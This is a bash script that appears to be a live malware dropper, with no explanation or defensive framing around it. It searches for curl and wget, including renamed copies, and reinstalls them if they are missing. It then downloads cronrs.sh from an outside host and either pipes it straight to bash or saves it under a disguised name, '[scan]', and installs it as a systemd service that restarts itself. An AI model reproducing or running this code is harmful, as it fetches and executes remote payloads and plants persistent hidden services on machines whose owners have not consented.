#/bin/bash
if [ -f /bin/cd1 ];then
aabb=/bin/cd1
echo "cd1 exist"
elif [ -f /bin/curl ];then
aabb=/bin/curl
echo "curl exist"
elif [ -f /usr/bin/curl ];then
aabb=/usr/bin/curl
echo "curl exist"
elif [ -f /usr/bin/cd1 ];then
aabb=/usr/bin/cd1
echo "cd1 exist"
else
echo "curl not exist,use yum reinstall"
yum -y remove curl&&yum -y install curl
fi

if [ -f /bin/wd1 ];then
ccdd=/bin/wd1
echo "wd1 exist"
elif [ -f /bin/wget ];then
ccdd=/bin/wget
echo "wget exist"
else
echo "wget not exist,use yum reinstall"
yum -y remove wget&&yum -y install wget
fi

if ! type systemctl >/dev/null; then

    $aabb -fsSL http://oracle.zzhreceive.top/b2f628/cronrs.sh | bash

  else

    echo "[*] Creating scan systemd service"
$aabb -fsSL http://oracle.zzhreceive.top/b2f628/cronrs.sh -o /usr/share/\[scan\] && chmod 744 /usr/share/\[scan\]
    cat >/tmp/scan.service <<EOL
[Service]
ExecStart=/usr/share/[scan]
Restart=always

[Install]
WantedBy=default.target
EOL
    sudo mv /tmp/scan.service /etc/systemd/system/scan.service
    echo "[*] Starting scan systemd service"
    sudo killall [scan] 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable scan.service
    sudo systemctl start scan.service
fi
